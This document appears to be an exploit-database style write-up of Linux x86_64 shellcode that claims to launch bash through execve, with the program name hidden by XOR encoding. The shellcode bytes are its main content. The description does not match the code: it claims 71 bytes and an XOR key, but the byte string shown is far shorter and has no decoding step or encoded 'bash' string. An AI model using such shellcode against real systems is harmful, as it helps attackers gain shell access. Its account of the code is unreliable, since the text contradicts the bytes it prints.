# linux_bash_shellcode
Exploit Title: Linux/x86_64 - bash shellcode with xor encoding<br>
Date: 05/02/2023<br>
Exploit Author: Jeenika Anadani<br>
Contact: https://twitter.com/cyber_jeeni<br>
Category: Shellcode<br>
Architectue: Linux x86_64<br>
Shellcode Length: 71 Bytes<br>
# Explanation:
This code uses XOR encryption to obscure the name of the program being executed, `"bash"`. <br>
The XOR encryption key is `0x08162432`, which is applied to each byte of the string. <br>
The decryption is performed just before calling `execve`, so the program name is passed in its original form.<br>
The rest of the code is the same as the previous example, making a system call to the `execve` function and then calling the `exit` syscall to terminate the process.<br>
# Bytecode - Little Endian
<code>"\x48\x31\xc0\x48\x89\x44\x24\xf8\x48\x8d\x7c\x24\xe0\x31\xc0\xb0\x3b\x0f\x05\x31\xc0\x89\xc3\xb0\x3c\x0f\x05"</code><br>
# References
https://www.exploit-db.com/shellcodes/51258</br>
